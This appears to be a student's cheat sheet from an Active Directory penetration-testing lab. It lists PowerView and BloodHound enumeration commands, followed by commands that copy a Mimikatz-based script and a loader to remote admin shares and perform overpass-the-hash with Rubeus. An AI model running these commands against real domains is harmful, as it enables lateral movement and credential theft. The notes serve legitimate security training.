## Get all domain computers
```
Get-DomainComputer | select samaccountname
```
```
Get-DomainComputer | select dnshostname
```

## Get all domain users
```
Get-DomainUser | select samaccountname
```

## Get domain details
```
Get-Domain
```

## Get domain SID
```
Get-DomainSID
```

## Get list of domain admins and enterprise admins
```
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
```
```
Get-DomainGroup -Identity "Enterprise Admins" -Domain moneycorp.local
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

## Blooudhound collection
```
Invoke-BloodHound -CollectionMethod All
```

## Find all computers with local admin access
```
Find-LocalAdminAccess
```

## Check ACLs using PowerView
```
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "studentx"}  
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

## Copy file to another machine
```
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys-stdx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

## Over pass the hash using rubeus
```
Run inside admin cmd
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:username /aes256:aeskey /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
